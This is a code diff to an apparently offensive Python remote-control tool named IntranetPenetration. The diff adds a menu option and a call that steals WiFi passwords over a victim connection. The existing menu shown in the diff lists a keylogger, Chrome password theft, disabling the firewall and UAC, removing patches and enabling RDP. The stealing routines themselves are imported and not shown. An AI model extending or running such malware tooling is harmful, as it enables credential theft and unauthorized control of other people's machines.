@@ -5,6 +5,7 @@ from prompt_toolkit.completion import WordCompleter
 from prompt_toolkit.formatted_text import ANSI
 from IntranetPenetration.SmallTools import keyboard
 from IntranetPenetration.SmallTools import GetChromePassword
+from IntranetPenetration.SmallTools import getWIFIPasswords
 
 from AuxiliaryFunctions import MyTable
 
@@ -48,6 +49,9 @@ class SmallTools:
                 elif choice == '7':
                     GetChromePassword.getChromePassword(conn)
                     continue
+                elif choice == '8':
+                    getWIFIPasswords.getWIFIPassword(conn)
+                    continue
             except KeyboardInterrupt:
                 print("exiting......")
                 break
@@ -68,7 +72,7 @@ class SmallTools:
         headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model" + '\033[0m', '\033[1;34;34m' + "usage" + '\033[0m', '\033[1;34;34m' + "description" + '\033[0m']
         mydata = [["1", "screenshot", "1 screenshot_name", "截图"], ["2", "Remove patch", "2", "删除补丁"], ["3", "service iptables stop", "3", "关闭防火墙"],
                   ["4", "Enable RDP", "4", "开启RDP"], ["5", "Keyloggers", "5", "键盘记录器"], ["6", "close UAC", "6", "关闭UAC"],
-                  ["7", "Stealing passwords from Google Chrome", "7", "盗取谷歌浏览器的密码"]]
+                  ["7", "Stealing passwords from Google Chrome", "7", "盗取谷歌浏览器的密码"], ["8", "Stealing WiFi passwords", "8", "盗取wifi密码"]]
         MyTable.createTable(headers, mydata)
 
     # 1
